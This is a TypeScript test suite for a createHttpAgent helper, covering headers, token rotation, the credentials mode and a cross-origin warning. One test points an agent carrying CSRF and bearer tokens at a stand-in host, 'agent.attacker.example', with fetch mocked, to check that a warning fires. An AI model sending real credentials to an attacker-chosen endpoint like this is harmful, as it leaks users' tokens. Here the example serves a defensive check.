import { HttpAgent } from "@ag-ui/client";
import { describe, expect, it } from "vitest";
import { createHttpAgent } from "../src/core/create_http_agent.js";

describe("createHttpAgent", () => {
  it("builds an HttpAgent pointed at the endpoint with headers", () => {
    const agent = createHttpAgent({
      endpoint: "/agent/",
      headers: { "X-CSRFToken": "abc" },
    });
    expect(agent).toBeInstanceOf(HttpAgent);
    expect((agent as HttpAgent).url).toBe("/agent/");
    expect((agent as HttpAgent).headers).toMatchObject({ "X-CSRFToken": "abc" });
  });

  it("defaults headers to an empty object", () => {
    const agent = createHttpAgent({ endpoint: "/agent/" });
    expect((agent as HttpAgent).headers).toEqual({});
  });

  it("threads a thread id and seeds initial messages when supplied", () => {
    const agent = createHttpAgent({
      endpoint: "/agent/",
      threadId: "t-123",
      initialMessages: [{ id: "m1", role: "user", content: "hi" } as never],
    });
    expect((agent as HttpAgent).threadId).toBe("t-123");
    expect((agent as HttpAgent).messages).toEqual([{ id: "m1", role: "user", content: "hi" }]);
  });

  it("provides a fetch wrapper that calls the global fetch as a free function", async () => {
    const agent = createHttpAgent({ endpoint: "/agent/" });
    const wrapped = (agent as HttpAgent).fetch;
    const original = globalThis.fetch;
    const calls: Array<[string, RequestInit]> = [];
    // Replace the global fetch with a recorder; the wrapper must reach it
    // without an illegal-invocation receiver error.
    globalThis.fetch = ((url: string, init: RequestInit) => {
      calls.push([url, init]);
      return Promise.resolve(new Response("ok"));
    }) as typeof fetch;
    try {
      const res = await wrapped("/agent/", { method: "POST" });
      expect(await res.text()).toBe("ok");
      expect(calls).toEqual([["/agent/", { method: "POST" }]]);
    } finally {
      globalThis.fetch = original;
    }
  });

  it("overlays getHeaders() on every request so rotated tokens reach the stream", async () => {
    let token = "token-1";
    const agent = createHttpAgent({
      endpoint: "/agent/",
      headers: { Authorization: `Bearer ${token}` },
      getHeaders: () => ({ Authorization: `Bearer ${token}` }),
    });
    const wrapped = (agent as HttpAgent).fetch;
    const original = globalThis.fetch;
    const seen: string[] = [];
    globalThis.fetch = ((_url: string, init: RequestInit) => {
      seen.push(new Headers(init.headers).get("Authorization") ?? "");
      return Promise.resolve(new Response("ok"));
    }) as typeof fetch;
    try {
      await wrapped("/agent/", { method: "POST", headers: { Authorization: "Bearer token-1" } });
      token = "token-2"; // rotate after the agent was constructed + cached
      await wrapped("/agent/", { method: "POST", headers: { Authorization: "Bearer token-1" } });
      expect(seen).toEqual(["Bearer token-1", "Bearer token-2"]);
    } finally {
      globalThis.fetch = original;
    }
  });

  it("sends the configured credentials mode with the run, headers or not", async () => {
    const original = globalThis.fetch;
    const seen: Array<RequestCredentials | undefined> = [];
    globalThis.fetch = ((_url: string, init: RequestInit) => {
      seen.push(init.credentials);
      return Promise.resolve(new Response("ok"));
    }) as typeof fetch;
    // Both arms of the wrapper: with a live header source and without one.
    const plain = createHttpAgent({ endpoint: "/agent/", credentials: "include" }) as HttpAgent;
    const rotating = createHttpAgent({
      endpoint: "/agent/",
      credentials: "include",
      getHeaders: () => ({ "X-Fresh": "yes" }),
    }) as HttpAgent;
    try {
      await plain.fetch("/agent/", { method: "POST" });
      await rotating.fetch("/agent/", { method: "POST" });
      expect(seen).toEqual(["include", "include"]);
    } finally {
      globalThis.fetch = original;
    }
  });

  it("warns before carrying host credentials to another origin", async () => {
    // The endpoint is a plain HTML attribute. A page that builds it from a
    // query parameter or from tenant-authored configuration hands an attacker
    // the destination, and the browser will happily preflight a custom header
    // and deliver the token to whoever answers. Nothing about that is visible
    // to the operator today: the very first request carries the credential,
    // before the user has done anything.
    const agent = createHttpAgent({
      endpoint: "https://agent.attacker.example/run/",
      headers: { "X-CSRFToken": "rotating-value" },
      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
    });
    const originalFetch = globalThis.fetch;
    const originalWarn = console.warn;
    const warnings: string[] = [];
    console.warn = (message: string) => void warnings.push(message);
    globalThis.fetch = (() => Promise.resolve(new Response("ok"))) as typeof fetch;
    try {
      await (agent as HttpAgent).fetch("https://agent.attacker.example/run/", { method: "POST" });
    } finally {
      globalThis.fetch = originalFetch;
      console.warn = originalWarn;
    }
    expect(warnings).toHaveLength(1);
    // Names the destination and both credential headers, so the warning is
    // actionable rather than merely alarming.
    expect(warnings[0]).toContain("https://agent.attacker.example");
    expect(warnings[0]).toContain("X-CSRFToken");
    expect(warnings[0]).toContain("Authorization");
  });

  it("reports a foreign origin once, and stays quiet about a trusted one", async () => {
    // Once, because a per-request notice on a legitimate cross-origin
    // deployment is noise that teaches the operator to filter the console —
    // which would take the first notice down with it. And nothing at all for an
    // origin the host has named, since that is the host confirming the
    // destination rather than being surprised by it.
    const foreign = createHttpAgent({
      endpoint: "https://agent.example.net/run/",
      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
    });
    const trusted = createHttpAgent({
      endpoint: "https://agent.example.net/run/",
      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
      trustedOrigins: ["https://agent.example.net"],
    });
    const originalFetch = globalThis.fetch;
    const originalWarn = console.warn;
    const warnings: string[] = [];
    console.warn = (message: string) => void warnings.push(message);
    globalThis.fetch = (() => Promise.resolve(new Response("ok"))) as typeof fetch;
    try {
      await (foreign as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
      await (foreign as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
      await (trusted as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
    } finally {
      globalThis.fetch = originalFetch;
      console.warn = originalWarn;
    }
    expect(warnings).toHaveLength(1);
  });

  it("keeps existing request init fields when overlaying headers", async () => {
    const agent = createHttpAgent({
      endpoint: "/agent/",
      getHeaders: () => ({ "X-Fresh": "yes" }),
    });
    const wrapped = (agent as HttpAgent).fetch;
    const original = globalThis.fetch;
    const calls: Array<{ method?: string; fresh: string | null; kept: string | null }> = [];
    globalThis.fetch = ((_url: string, init: RequestInit) => {
      const headers = new Headers(init.headers);
      calls.push({
        ...(init.method !== undefined ? { method: init.method } : {}),
        fresh: headers.get("X-Fresh"),
        kept: headers.get("Content-Type"),
      });
      return Promise.resolve(new Response("ok"));
    }) as typeof fetch;
    try {
      await wrapped("/agent/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
      expect(calls).toEqual([{ method: "POST", fresh: "yes", kept: "application/json" }]);
    } finally {
      globalThis.fetch = original;
    }
  });
});
